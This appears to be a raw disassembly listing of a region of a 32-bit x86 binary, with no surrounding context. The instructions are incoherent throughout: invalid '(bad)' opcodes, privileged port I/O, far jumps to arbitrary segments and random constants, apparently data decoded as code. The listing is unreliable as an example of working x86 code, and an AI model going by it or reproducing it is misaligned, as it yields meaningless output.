  41a228:	xor    al,0x56
  41a22a:	(bad)
  41a22e:	xor    al,0x3e
  41a230:	adc    eax,0x7322222c
  41a235:	std    
  41a236:	pushf  
  41a237:	test   al,0xcc
  41a239:	in     al,dx
  41a23a:	(bad)  
  41a23b:	push   esp
  41a23c:	test   al,0x35
  41a23e:	cmp    BYTE PTR [ecx+ebp*4+0x3d],dh
  41a242:	ins    BYTE PTR es:[edi],dx
  41a243:	push   ebp
  41a244:	push   cs
  41a245:	mov    ecx,0xba99d8b7
  41a24a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a24b:	and    DWORD PTR ds:0xb1928320,esp
  41a251:	out    dx,al
  41a252:	sub    al,cl
  41a254:	aas    
  41a255:	add    al,0x4b
  41a257:	cs push ecx
  41a259:	es pop ds
  41a25b:	adc    BYTE PTR [esp+eax*2],bh
  41a25e:	outs   dx,DWORD PTR ds:[esi]
  41a25f:	shl    DWORD PTR [eax+0x3b],cl
  41a262:	inc    edx
  41a263:	or     dh,ch
  41a265:	jo     0x41a2e6
  41a267:	icebp  
  41a268:	es into 
  41a26a:	sar    ebx,0xad
  41a26d:	jle    0x41a239
  41a26f:	sbb    edi,ecx
  41a271:	in     al,0xe0
  41a273:	shr    dh,1
  41a275:	loopne 0x41a27d
  41a277:	dec    ebp
  41a278:	retf   
  41a279:	push   edi
  41a27a:	xchg   ecx,eax
  41a27b:	jae    0x41a2c9
  41a27d:	in     eax,0x18
  41a27f:	mov    BYTE PTR [esi-0x2eff7e65],cl
  41a285:	cmp    DWORD PTR [edx],esi
  41a287:	paddusw mm5,QWORD PTR [ecx+0x1a]
  41a28b:	or     esp,eax
  41a28d:	mov    ecx,0xffb17ee3
  41a292:	fidiv  DWORD PTR [eax+eiz*4-0xd]
  41a296:	retf   0xd05a
  41a299:	adc    eax,0x7be783eb
  41a29e:	in     eax,0x69
  41a2a0:	jns    0x41a2f4
  41a2a2:	in     eax,dx
  41a2a3:	bound  ebx,QWORD PTR [edx+0x61]
  41a2a6:	scas   al,BYTE PTR es:[edi]
  41a2a7:	sbb    eax,0x5c7591f7
  41a2ac:	push   ebx
  41a2ad:	pusha  
  41a2ae:	jecxz  0x41a2d4
  41a2b0:	or     BYTE PTR [edx-0x72],al
  41a2b3:	or     eax,DWORD PTR [edi+ebx*2]
  41a2b6:	jae    0x41a2c4
  41a2b8:	(bad)  
  41a2b9:	(bad)  
  41a2ba:	fs inc ecx
  41a2bc:	mov    ebp,DWORD PTR [ebp+0x79c9ed1d]
  41a2c2:	jns    0x41a319
  41a2c4:	in     eax,0x4
  41a2c6:	shr    DWORD PTR ds:0xe7422988,1
  41a2cc:	jg     0x41a298
  41a2ce:	push   esi
  41a2cf:	inc    esi
  41a2d0:	xchg   ebx,eax
  41a2d1:	loop   0x41a288
  41a2d3:	nop
  41a2d4:	and    BYTE PTR [ebx],dl
  41a2d6:	and    BYTE PTR [edx-0x32],bh
  41a2d9:	cwde   
  41a2da:	ret    0x41bc
  41a2dd:	or     DWORD PTR [eax+0x3da3650b],edi
  41a2e3:	cmp    cl,bh
  41a2e5:	imul   ecx,edi,0x6e
  41a2e8:	add    eax,0x5815a58e
  41a2ed:	push   0x4d
  41a2ef:	mov    ebp,DWORD PTR [ebx]
  41a2f1:	faddp  st(4),st
  41a2f3:	ins    BYTE PTR es:[edi],dx
  41a2f4:	xchg   edx,eax
  41a2f5:	pop    ss
  41a2f6:	sub    eax,0x2ef80e16
  41a2fb:	shl    al,cl
  41a2fd:	mov    ds:0xb55fbadd,eax
  41a302:	pop    esp
  41a303:	mov    fs,WORD PTR [edi+0xc5e7f7c]
  41a309:	rol    BYTE PTR [ecx],0x1d
  41a30c:	stos   DWORD PTR es:[edi],eax
  41a30d:	retf   0xc97b
  41a310:	sub    al,0xa2
  41a312:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41a314:	mov    bh,0x78
  41a316:	pop    ecx
  41a317:	enter  0xb597,0x90
  41a31b:	fmulp  st(4),st
  41a31d:	jmp    0x7c87:0x9689870e
  41a324:	adc    BYTE PTR [esi+0x2b6a5451],ch
  41a32a:	xlat   BYTE PTR ds:[ebx]
  41a32b:	cmc    
  41a32c:	shl    ebp,1
  41a32e:	mov    al,ds:0xf5632d78
  41a333:	push   ds
  41a334:	call   0x21d12365
  41a339:	push   esi
  41a33a:	jl     0x41a332
  41a33c:	jle    0x41a331
  41a33e:	and    BYTE PTR [eax],cl
  41a340:	pop    ss
  41a341:	mov    BYTE PTR [esi-0x125b56a4],ch
  41a347:	iret   
  41a348:	fbld   TBYTE PTR [ebx-0x99e24e7]
  41a34e:	push   edi
  41a34f:	jp     0x41a34d
  41a351:	pop    eax
  41a352:	push   0x53d3bb41
  41a357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a358:	dec    esp
  41a359:	jg     0x41a2ef
  41a35b:	add    eax,0x3907e1e
  41a360:	stos   DWORD PTR es:[edi],eax
  41a361:	cmp    BYTE PTR [esi+0x6188619d],dl
  41a367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a368:	mov    esp,0xbb106788
  41a36d:	jae    0x41a320
  41a36f:	sbb    eax,0x6154607f
  41a374:	fbld   TBYTE PTR [eax+0x2166f974]
  41a37a:	or     dl,BYTE PTR [eax]
  41a37c:	mov    BYTE PTR [ebx-0x33],dh
  41a37f:	scas   eax,DWORD PTR es:[edi]
  41a380:	lea    edi,ds:0x1d619763
  41a386:	test   bh,bh
  41a388:	arpl   WORD PTR [ecx+ecx*1],di
  41a38b:	adc    eax,0x76d57f66
  41a390:	and    edx,edi
  41a392:	or     DWORD PTR [eax+0x17],esp
  41a395:	xchg   ecx,eax
  41a396:	mov    eax,DWORD PTR [ecx]
  41a398:	sbb    eax,0xd08e5f47
  41a39d:	(bad)  
  41a39e:	sbb    ch,bh
  41a3a0:	pop    ss
  41a3a1:	mov    ebx,0x8b0c4b91
  41a3a6:	push   ebp
  41a3a7:	inc    eax
  41a3a8:	or     eax,0xa5bb862a
  41a3ad:	pop    ds
  41a3ae:	ins    BYTE PTR es:[edi],dx
  41a3af:	mov    eax,ds:0x483639bf
  41a3b4:	ins    BYTE PTR es:[edi],dx
  41a3b5:	mov    dl,0xa8
  41a3b7:	outs   dx,DWORD PTR ds:[esi]
  41a3b8:	pop    es
  41a3b9:	jp     0x41a39b
  41a3bb:	dec    ebp
  41a3bc:	out    dx,eax
  41a3bd:	mov    eax,DWORD PTR [esi+0x6f667ae9]
  41a3c3:	mov    cl,0x36
  41a3c5:	or     DWORD PTR [eax-0x15aaadc8],esi
  41a3cb:	push   0x33
  41a3cd:	fwait
  41a3ce:	leave  
  41a3cf:	fisub  DWORD PTR [edi+0x1b]
  41a3d2:	pop    eax
  41a3d3:	dec    edx
  41a3d4:	inc    ebx
  41a3d5:	xchg   edx,eax
  41a3d6:	shr    DWORD PTR [esi+edi*2+0x6],cl
  41a3da:	loop   0x41a3da
  41a3dc:	fild   QWORD PTR [edx]
  41a3de:	or     al,0x2b
  41a3e0:	fstp   QWORD PTR [ecx-0x6b]
  41a3e3:	fild   WORD PTR [ebx+0x6edd9723]
  41a3e9:	fst    DWORD PTR [edi]
  41a3eb:	mov    dh,0x85
  41a3ed:	inc    esp
  41a3ee:	add    ah,BYTE PTR [edi]
  41a3f0:	std    
  41a3f1:	repnz aas 
  41a3f3:	pop    edi
  41a3f4:	or     al,0xf1
  41a3f6:	imul   edx,DWORD PTR [ebp+0x17],0xb0eb36e8
  41a3fd:	and    al,0x77
  41a3ff:	sbb    al,0xd9
  41a401:	jle    0x41a434
  41a403:	and    BYTE PTR [ebx+eax*1+0x2d918c9],0xe8
  41a40b:	daa    
  41a40c:	sbb    ch,BYTE PTR [ebx+0xd]
  41a40f:	xchg   edi,eax
  41a410:	mov    eax,ds:0x93936819
  41a415:	out    dx,al
  41a416:	leave  
  41a417:	add    edi,DWORD PTR [esp+ebx*1]
  41a41a:	pop    esi
  41a41b:	mov    eax,ds:0xb5c3647b
  41a420:	sbb    ch,BYTE PTR [ebx+esi*8-0xe]
  41a424:	sub    BYTE PTR [eiz*2-0x1055168f],dh
  41a42b:	(bad)  
  41a42c:	leave  
  41a42d:	mov    BYTE PTR ss:[esi+0x37e20ab5],bl
  41a434:	int    0xb4
  41a436:	xchg   ecx,eax
  41a437:	pusha  
  41a438:	icebp  
  41a439:	jnp    0x41a3c0
  41a43b:	jb     0x41a48b
  41a43d:	lea    ebx,[esi+0x69]
  41a440:	scas   al,BYTE PTR es:[edi]
  41a441:	imul   ebp,eax,0x6571749a
  41a447:	dec    esp
  41a448:	xor    eax,DWORD PTR [ecx]
  41a44a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a44b:	cmp    cl,BYTE PTR [ebp+ecx*8-0x2]
  41a44f:	adc    edx,DWORD PTR [eax-0x74]
  41a452:	addr16 jg 0x41a465
  41a455:	mov    dh,0xce
  41a457:	and    bh,BYTE PTR [eax]
  41a459:	jp     0x41a415
  41a45b:	push   ebx
  41a45c:	xchg   esi,eax
  41a45d:	fwait
  41a45e:	push   edx
  41a45f:	jge    0x41a453
  41a461:	ss cdq 
  41a463:	sbb    BYTE PTR [esi+0x73e45b1b],0x76
  41a46a:	in     al,dx
  41a46b:	ret    0xea30
  41a46e:	jp     0x41a4e6
  41a470:	cdq    
  41a471:	mov    dl,ah
  41a473:	xchg   ebp,eax
  41a474:	int3   
  41a475:	outs   dx,BYTE PTR ds:[esi]
  41a476:	fnstenv [edi+0x7c]
  41a479:	out    0xd0,al
  41a47b:	out    dx,al
  41a47c:	sbb    al,0xc0
  41a47e:	pop    esi
  41a47f:	retf   
  41a480:	pop    ebx
  41a481:	pop    esi
  41a482:	imul   edx,DWORD PTR [ebp+ecx*8-0x3e],0xffffffd9
  41a487:	and    eax,0x38e67a21
  41a48c:	dec    eax
  41a48d:	xor    al,0x43
  41a48f:	mov    al,0x92
  41a491:	mov    edx,0x30e4da2e
  41a496:	dec    edi
  41a497:	nop
  41a498:	adc    DWORD PTR [ecx-0x399eac3f],ebx
  41a49e:	jb     0x41a46f
  41a4a0:	mov    ebp,0x173dca4a
  41a4a5:	repnz data16 outs dx,BYTE PTR ds:[esi]
  41a4a8:	or     DWORD PTR [ecx+0x35e38176],esi
  41a4ae:	repz inc esp
  41a4b0:	out    dx,eax
  41a4b1:	test   al,0xec
  41a4b3:	inc    ebp
  41a4b4:	mov    dh,0x83
  41a4b6:	lds    edx,FWORD PTR [edx+0x43]
  41a4b9:	ss popa 
  41a4bb:	jo     0x41a4da
  41a4bd:	xchg   DWORD PTR gs:[esi-0x77],edi
  41a4c1:	inc    edi
  41a4c2:	inc    ecx
  41a4c3:	dec    BYTE PTR [esi+0x22]
  41a4c6:	dec    ebx
  41a4c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4c8:	sub    ebp,esi
  41a4ca:	and    BYTE PTR ds:0x1033db9d,al
  41a4d0:	pop    ecx
  41a4d1:	fistp  WORD PTR [ecx+eax*2-0x375780dd]
  41a4d8:	dec    ecx
  41a4d9:	inc    ecx
  41a4da:	aam    0xc8
  41a4dc:	jmp    0x1e09:0xaaafa16f
  41a4e3:	xchg   ebx,eax
  41a4e4:	iret   
  41a4e5:	push   esp
  41a4e6:	jp     0x41a474
  41a4e8:	sti    
  41a4e9:	inc    edi
  41a4ea:	jp     0x41a4c2
  41a4ec:	mov    ebx,0x70c343b7
  41a4f1:	cli    
  41a4f2:	sahf   
  41a4f3:	mov    eax,0xb3dcd857
  41a4f8:	int3   
  41a4f9:	(bad)  
  41a4fa:	int    0xf4
  41a4fc:	ins    BYTE PTR es:[edi],dx
  41a4fd:	pop    eax
  41a4fe:	cmp    dl,ah
  41a500:	pop    ecx
  41a501:	cs mov ebp,0xf580a6fe
  41a507:	ret    0x53cc
  41a50a:	mov    dh,0x4d
  41a50c:	in     eax,dx
  41a50d:	stc    
  41a50e:	ins    BYTE PTR es:[edi],dx
  41a50f:	dec    edi
  41a510:	inc    esp
  41a511:	sub    dl,ch
  41a513:	fcom   DWORD PTR [ebx+0x20]
  41a516:	adc    al,0xc6
  41a518:	inc    eax
  41a519:	stos   DWORD PTR es:[edi],eax
  41a51a:	dec    edi
  41a51b:	fisub  DWORD PTR [ecx-0x4dfbfc89]
  41a521:	loope  0x41a4fa
  41a523:	xchg   edx,eax
  41a524:	jecxz  0x41a4d7
  41a526:	cmp    BYTE PTR [edx+0x4f374c83],bl
  41a52c:	mov    edi,0xc3ecfd1f
  41a531:	adc    esp,DWORD PTR [edi-0x41]
  41a534:	or     BYTE PTR [esi-0x38],0x41
  41a538:	scas   eax,DWORD PTR es:[edi]
  41a539:	outs   dx,BYTE PTR ds:[esi]
  41a53a:	sar    BYTE PTR [edx+0x652cd981],cl
  41a540:	xchg   ebx,eax
  41a541:	xor    bl,BYTE PTR [edx+0x1510719f]
  41a547:	push   edi
  41a548:	mov    ds:0x4062529d,eax
  41a54d:	push   ecx
  41a54e:	adc    BYTE PTR [edx+0x86ac72],0xfd
  41a555:	aam    0xee
  41a557:	jg     0x41a52e
  41a559:	dec    ebx
  41a55a:	mov    al,ds:0xf877b32
  41a55f:	push   ss
  41a560:	and    DWORD PTR [edi+ebp*8+0x787f43b8],esp
  41a567:	jbe    0x41a542
  41a569:	(bad)  
  41a56a:	int    0xf
  41a56c:	pop    esi
  41a56d:	(bad)  
  41a56e:	sbb    eax,DWORD PTR [ecx+0x75]
  41a571:	shr    BYTE PTR [eax-0x386083e8],1
  41a577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a578:	ds push cs
  41a57a:	mov    edx,0x366bd991
  41a57f:	xor    cl,dl
  41a581:	adc    bh,0x6e
  41a584:	mov    cl,0x9f
  41a586:	inc    ebx
  41a587:	cmp    DWORD PTR [eax-0x13],ebp
  41a58a:	stos   BYTE PTR es:[edi],al
  41a58b:	add    DWORD PTR [ebx-0x21],0xffffffd6
  41a58f:	fisub  WORD PTR [ecx-0x6e]
  41a592:	xor    al,dl
  41a594:	aas    
  41a595:	cmp    ebp,DWORD PTR [edi+0x424dc469]
  41a59b:	clc    
  41a59c:	and    esi,ebp
  41a59e:	fdivr  QWORD PTR [ebx]
  41a5a0:	and    eax,0xa510df61
  41a5a5:	mov    dl,0x3b
  41a5a7:	(bad)  
  41a5a8:	cmc    
  41a5a9:	shr    DWORD PTR [esi],0x2
  41a5ac:	hlt    
  41a5ad:	and    al,0x7b
  41a5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b0:	ss (bad) 
  41a5b2:	xchg   BYTE PTR [eax+0x71],ah
  41a5b5:	fistp  QWORD PTR [edx-0x105a6f29]
  41a5bb:	inc    eax
  41a5bc:	imul   ecx,eax,0x160ccfca
  41a5c2:	out    0x36,al
  41a5c4:	(bad)  
  41a5c5:	jns    0x41a58f
  41a5c7:	sub    eax,0xf44e4b45
  41a5cc:	(bad)  
  41a5cd:	nop
  41a5ce:	fs or  dh,al
  41a5d1:	sub    bh,bh
  41a5d3:	jge    0x41a632
  41a5d5:	fist   WORD PTR [esi]
  41a5d7:	ja     0x41a593
  41a5d9:	jmp    0xb054:0x5c5e7782
  41a5e0:	in     eax,dx
  41a5e1:	hlt    
  41a5e2:	aaa    
  41a5e3:	jbe    0x41a599
  41a5e5:	adc    cl,cl
  41a5e7:	pop    edx
  41a5e8:	sub    eax,esi
  41a5ea:	xor    dh,cl
  41a5ec:	dec    ebp
  41a5ed:	fsubr  QWORD PTR fs:[edi+0x7d]
  41a5f1:	sub    bh,BYTE PTR [ebx+0x26]
  41a5f4:	jge    0x41a598
  41a5f6:	sbb    BYTE PTR [ecx+0x7a],dh
  41a5f9:	pop    esi
  41a5fa:	(bad)  
  41a5fb:	xor    al,0xb9
  41a5fd:	imul   ecx,DWORD PTR [edi+ebp*4-0x12c4fb19],0x35
  41a605:	pop    esp
  41a606:	mov    ds:0x8280eb1,al
  41a60b:	inc    esp
  41a60c:	mov    ch,0x56
  41a60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a60f:	in     eax,0xa3
  41a611:	cmp    esp,edx
  41a613:	xchg   ecx,eax
  41a614:	add    al,BYTE PTR [edi-0x57]
  41a617:	rcr    BYTE PTR [ecx+eax*8-0x56],0x55
  41a61c:	fwait
  41a61d:	aas    
  41a61e:	xchg   ebp,eax
  41a61f:	pop    esp
  41a620:	daa    
  41a621:	lea    ebx,[edi]
  41a623:	push   ebp
  41a624:	sub    dl,BYTE PTR [edi+0x29eab723]
  41a62a:	add    DWORD PTR ds:[edi-0x3abd1e6b],ebx
  41a631:	xchg   ebx,eax
  41a632:	hlt    
  41a633:	lods   eax,DWORD PTR ds:[esi]
  41a634:	(bad)  
  41a635:	repz sbb cl,BYTE PTR [ecx]
  41a638:	cmc    
  41a639:	pop    ds
  41a63a:	jb     0x41a5fb
  41a63c:	sbb    dl,BYTE PTR [eax+0x56]
  41a63f:	mov    edi,0xa994345c
  41a644:	mov    ebx,0xc445c736
  41a649:	jb     0x41a651
  41a64b:	pop    ss
  41a64c:	mov    al,0x3c
  41a64e:	add    bh,BYTE PTR [esi]
  41a650:	sbb    edi,DWORD PTR ds:0x497ebe29
  41a656:	pusha  
  41a657:	and    dl,bl
  41a659:	push   esi
  41a65a:	loop   0x41a6cc
  41a65c:	addr16 dec edx
  41a65e:	sub    dl,BYTE PTR [ebx+0x258f6e2f]
  41a664:	aaa    
  41a665:	sub    BYTE PTR [eax+edi*4-0x7882cb5f],ch
  41a66c:	loope  0x41a626
  41a66e:	sbb    eax,0x8de59784
  41a673:	cdq    
  41a674:	dec    ebx
  41a675:	mul    DWORD PTR [ebx+0x64]
  41a678:	test   al,0x37
  41a67a:	adc    eax,0x5b8306e9
  41a67f:	push   0xffffffa5
  41a681:	and    BYTE PTR [esi-0xa],cl
  41a684:	add    DWORD PTR [edx],ebp
  41a686:	das    
  41a687:	or     bh,BYTE PTR [ebx-0x5b]
  41a68a:	inc    ebx
  41a68b:	jns    0x41a69f
  41a68d:	jmp    0xd2f5f352
  41a692:	ds ss jne 0x41a63a
  41a696:	loopne 0x41a67d
  41a698:	das    
  41a699:	(bad)  
  41a69a:	xor    eax,0xc72eb574
  41a69f:	push   ebx
  41a6a0:	push   es
  41a6a1:	icebp  
  41a6a2:	retf   0x4063
  41a6a5:	sar    BYTE PTR [eax-0x337735f7],cl
  41a6ab:	jl     0x41a704
  41a6ad:	shl    DWORD PTR [edx],1
  41a6af:	cmp    esp,ebx
  41a6b1:	inc    esi
  41a6b2:	test   DWORD PTR [ebp+0x34bbd448],esi
  41a6b8:	and    al,0x3b
  41a6ba:	rcl    ebp,cl
  41a6bc:	xchg   edx,eax
  41a6bd:	test   al,0xdd
  41a6bf:	sub    DWORD PTR [ebx+0x8f50973],0xf829f0bf
  41a6c9:	stos   BYTE PTR es:[edi],al
  41a6ca:	push   ebp
  41a6cb:	sar    ch,0x9f
  41a6ce:	nop
  41a6cf:	xor    al,0x66
  41a6d1:	xchg   ecx,eax
  41a6d2:	pop    esp
  41a6d3:	mov    esi,0x99ae549b
  41a6d8:	inc    esi
  41a6d9:	cli    
  41a6da:	inc    eax
  41a6db:	or     DWORD PTR [esi+0x77],ecx
  41a6de:	pop    ebp
  41a6df:	jg     0x41a664
  41a6e1:	adc    al,0xfb
  41a6e3:	aaa    
  41a6e4:	jle    0x41a6b6
  41a6e6:	hlt    
  41a6e7:	(bad)
  41a6eb:	les    edx,FWORD PTR [eax+eax*1-0x12d70073]
  41a6f2:	xchg   edx,eax
  41a6f3:	repnz fwait
  41a6f5:	pop    edi
  41a6f6:	in     al,0x50
  41a6f8:	mov    esp,0xa10a5558
  41a6fd:	xchg   edx,eax
  41a6fe:	ret    
  41a6ff:	xor    ebx,DWORD PTR [ebx+0x44]
  41a702:	pop    ecx
  41a703:	ins    DWORD PTR es:[edi],dx
  41a704:	sub    bl,BYTE PTR [esi+eiz*4+0x5cdf321a]
  41a70b:	(bad)  
  41a70c:	shr    BYTE PTR [ebp-0x21],0xfd
  41a710:	dec    ebp
  41a711:	xchg   esi,eax
  41a712:	not    BYTE PTR [ecx+0x22]
  41a715:	call   0x1c5d:0x6be3f290
  41a71c:	xchg   edi,eax
  41a71d:	pop    edx
  41a71e:	sahf   
  41a71f:	and    ah,bl
  41a721:	push   ebp
  41a722:	push   es
  41a723:	dec    esi
  41a724:	fcomp  DWORD PTR [ebp-0x1f6e6a60]
  41a72a:	xor    BYTE PTR [ebx-0x5f386c88],0xa1
  41a731:	out    0xaa,al
  41a733:	inc    ebp
  41a734:	mov    edi,0x7e36b607
  41a739:	icebp  
  41a73a:	pop    ebp
  41a73b:	mov    bh,0xf2
  41a73d:	(bad)  
  41a73e:	xchg   ebp,eax
  41a73f:	mov    eax,ds:0xd0bfd36e
  41a744:	pop    ebx
  41a745:	lods   eax,DWORD PTR ds:[esi]
  41a746:	xchg   ebp,eax
  41a747:	jle    0x41a782
  41a749:	push   cs
  41a74a:	add    DWORD PTR [edx+0x18],eax
  41a74d:	jl     0x41a737
  41a74f:	xor    cl,ah
  41a751:	jge    0x41a76f
  41a753:	neg    BYTE PTR [ebx-0x67]
  41a756:	push   cs
  41a757:	and    ebp,esp
  41a759:	pop    eax
  41a75a:	pop    ebp
  41a75b:	sti    
  41a75c:	mov    edi,0x75411d97
  41a761:	add    ebx,eax
  41a763:	mov    edi,0x45adb7c2
  41a768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a769:	fisubr DWORD PTR [ebx]
  41a76b:	mov    dl,0x18
  41a76d:	dec    edx
  41a76e:	mov    dh,BYTE PTR [ebx-0x35]
  41a771:	adc    ecx,eax
  41a773:	aam    0x8f
  41a775:	mov    BYTE PTR [ecx],0xb8
  41a778:	cmp    edi,DWORD PTR [eax-0x20]
  41a77b:	repnz lods al,BYTE PTR ds:[esi]
  41a77d:	iret   
  41a77e:	xchg   ebx,eax
  41a77f:	sbb    al,0xfd
  41a781:	je     0x41a7fb
  41a783:	jne    0x41a7cf
  41a785:	fimul  WORD PTR [esi+0x67d0f723]
  41a78b:	sbb    edx,DWORD PTR ds:0x48d106b9
  41a791:	push   esp
  41a792:	repz inc ecx
  41a794:	mov    bl,0xbe
  41a796:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a798:	pop    ebp
  41a799:	xchg   DWORD PTR [edx-0x45],ebp
  41a79c:	stos   DWORD PTR es:[edi],eax
  41a79d:	mov    edx,0x2fd36f7d
  41a7a2:	pushf  
  41a7a3:	mov    ch,0xd3
  41a7a5:	(bad)  
  41a7a6:	outs   dx,BYTE PTR ds:[esi]
  41a7a7:	adc    BYTE PTR [ecx+0x24],al
  41a7aa:	inc    esp
  41a7ab:	push   ecx
  41a7ac:	arpl   ax,si
  41a7ae:	out    dx,al
  41a7af:	mov    ecx,0xddf4e967
  41a7b4:	(bad)  
  41a7b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b7:	push   ds
  41a7b8:	rcl    DWORD PTR [edx-0x51065d94],cl
  41a7be:	xor    al,0x28
  41a7c0:	fwait
  41a7c1:	pop    ss
  41a7c2:	lods   al,BYTE PTR ds:[esi]
  41a7c3:	xchg   ebx,eax
  41a7c4:	mov    bl,0xc0
  41a7c6:	mov    al,ds:0x8d6df1d4
  41a7cb:	or     BYTE PTR [ebx+0x4d],0xa2
  41a7cf:	sub    bh,BYTE PTR [ebx]
  41a7d1:	pop    edx
  41a7d2:	push   es
  41a7d3:	mov    ds:0xda5dfe38,al
  41a7d8:	ins    DWORD PTR es:[edi],dx
  41a7d9:	jmp    0x2a7876fe
  41a7de:	das    
  41a7df:	or     dl,BYTE PTR [esi+ecx*1+0x40b5c5c8]
  41a7e6:	shl    DWORD PTR [ecx-0x6aa75788],0xff
  41a7ed:	fdivr  QWORD PTR [esi+0x507704d8]
  41a7f3:	iret   
  41a7f4:	imul   esp,esp,0xffffffea
  41a7f7:	pop    esp
  41a7f8:	out    dx,al
  41a7f9:	dec    ecx
  41a7fa:	pop    edi
  41a7fb:	xor    al,0xdf
  41a7fd:	dec    edi
  41a7fe:	push   esi
  41a7ff:	dec    esi
  41a800:	repnz xchg ebx,eax
  41a802:	pop    ebp
  41a803:	lods   al,BYTE PTR ds:[esi]
  41a804:	leave  
  41a805:	outs   dx,DWORD PTR ds:[esi]
  41a806:	fisttp QWORD PTR [edx-0x7df6c45f]
  41a80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a80d:	pop    ecx
  41a80e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a810:	jno    0x41a7a5
  41a812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a813:	sbb    eax,edx
  41a815:	cmp    al,0x88
  41a817:	mov    eax,ds:0x8106caaa
  41a81c:	test   ebx,0xda579d2d
  41a822:	mov    edx,0xe6f00954
  41a827:	xchg   ebx,eax
  41a828:	int3   
  41a829:	adc    dh,bh
  41a82b:	fwait
  41a82c:	xor    al,0xe2
  41a82e:	dec    ecx
  41a82f:	and    ebx,DWORD PTR [esi+0x4bd3d877]
  41a835:	inc    esp
  41a836:	inc    esp
  41a837:	jmp    0xafbc:0x23b43064
  41a83e:	lods   al,BYTE PTR ds:[esi]
  41a83f:	dec    edi
  41a840:	push   ecx
  41a841:	daa    
  41a842:	fdiv   DWORD PTR [esi+0x2944148c]
  41a848:	pusha  
  41a849:	rcr    BYTE PTR [edi],1
  41a84b:	jne    0x41a81c
  41a84d:	pop    esp
  41a84e:	ins    BYTE PTR es:[edi],dx
  41a84f:	mov    dh,0xe0
  41a851:	int3   
  41a852:	in     al,0x80
  41a854:	xchg   esi,eax
  41a855:	adc    al,al
  41a857:	xchg   BYTE PTR [esi],ch
  41a859:	out    0x0,eax
  41a85b:	xchg   edx,eax
  41a85c:	mov    BYTE PTR [eax],bh
  41a85e:	push   0xead8e4df
  41a863:	push   0x31
  41a865:	jmp    0xa725:0x5848c1f2
  41a86c:	sub    al,0xff
  41a86e:	loop   0x41a81e
  41a870:	cld    
  41a871:	in     eax,dx
  41a872:	xor    BYTE PTR [ecx+0x1bb0cc73],bh
  41a878:	and    al,0x0
  41a87a:	icebp  
  41a87b:	shl    DWORD PTR [eiz*8-0x6155a836],cl
  41a882:	pshufw mm7,QWORD PTR [esi-0xda9f7fc],0xa5
  41a88a:	push   eax
  41a88b:	push   esi
  41a88c:	mov    eax,ds:0x6df3d1c1
  41a891:	cmp    BYTE PTR [eax-0x62c5859d],al
  41a897:	sti    
  41a898:	adc    BYTE PTR [esi+0x30],al
  41a89b:	cmc    
  41a89c:	je     0x41a820
  41a89e:	dec    ecx
  41a89f:	mov    cl,0x40
  41a8a1:	xor    al,0xef
  41a8a3:	iret   
  41a8a4:	bound  esp,QWORD PTR [ecx+0x2728b665]
  41a8aa:	mov    edx,DWORD PTR [ebx+0x5f6da862]
  41a8b0:	inc    ebp
  41a8b1:	outs   dx,BYTE PTR ds:[esi]
  41a8b2:	fbld   TBYTE PTR [eax+0x3d]
  41a8b5:	scas   eax,DWORD PTR es:[edi]
  41a8b6:	fisttp QWORD PTR [ebp+0x37b6e430]
  41a8bc:	ret    
  41a8bd:	cmc    
  41a8be:	addr16 push es
  41a8c0:	mov    al,0xcf
  41a8c2:	in     eax,0x80
  41a8c4:	dec    edi
  41a8c5:	mov    es:0xc34c47aa,al
  41a8cb:	dec    edi
  41a8cc:	lock pusha 
  41a8ce:	ss hlt 
  41a8d0:	jle    0x41a94a
  41a8d2:	repz pop ebp
  41a8d4:	xor    ah,BYTE PTR [ebp+0x7e]
  41a8d7:	ficomp DWORD PTR [ecx]
  41a8d9:	leave  
  41a8da:	outs   dx,DWORD PTR ds:[esi]
  41a8db:	out    dx,al
  41a8dc:	and    esp,DWORD PTR [ecx]
  41a8de:	mov    eax,ds:0x4d63b6e3
  41a8e3:	pop    esi
  41a8e4:	mov    WORD PTR [ecx+edx*8],?
  41a8e7:	outs   dx,BYTE PTR ds:[esi]
  41a8e8:	in     eax,0x45
  41a8ea:	aaa    
  41a8eb:	sar    BYTE PTR [eax-0x108a4beb],0xaf
  41a8f2:	fldenv [esi]
  41a8f4:	mov    al,0xc6
  41a8f6:	data16 and al,0x9
  41a8f9:	imul   edi,DWORD PTR [edi-0x2caea569],0x1e
  41a900:	das    
  41a901:	xchg   ebx,eax
  41a902:	or     cl,BYTE PTR [ebx+0x1f42d2b2]
  41a908:	pop    ebx
  41a909:	xlat   BYTE PTR ds:[ebx]
  41a90a:	mov    edi,0x986f122d
  41a90f:	fwait
  41a910:	stos   BYTE PTR es:[edi],al
  41a911:	pop    es
  41a912:	pop    ebx
  41a913:	aad    0xb8
  41a915:	and    BYTE PTR [ecx+ebp*8+0x5be31081],bl
  41a91c:	and    eax,0x38aee09c
  41a921:	adc    ebx,esp
  41a923:	int    0x9d
  41a925:	aad    0xae
  41a927:	das    
  41a928:	sbb    BYTE PTR ds:0xc2f5b913,bh
  41a92e:	or     DWORD PTR [eax-0x4f525693],ecx
  41a934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a935:	mov    ch,0x3c
  41a937:	mov    eax,ds:0x86080ede
  41a93c:	cdq    
  41a93d:	pop    eax
  41a93e:	icebp  
  41a93f:	in     al,0xef
  41a941:	packssdw mm1,mm3
  41a944:	push   ebx
  41a945:	stc    
  41a946:	jmp    0x7a40:0x4fa2126d
  41a94d:	in     al,0x92
  41a94f:	(bad)  
  41a950:	stos   DWORD PTR es:[edi],eax
  41a951:	dec    ebp
  41a952:	mov    dh,0xee
  41a954:	lock push es
  41a956:	dec    ecx
  41a957:	mov    eax,ds:0x7f4af084
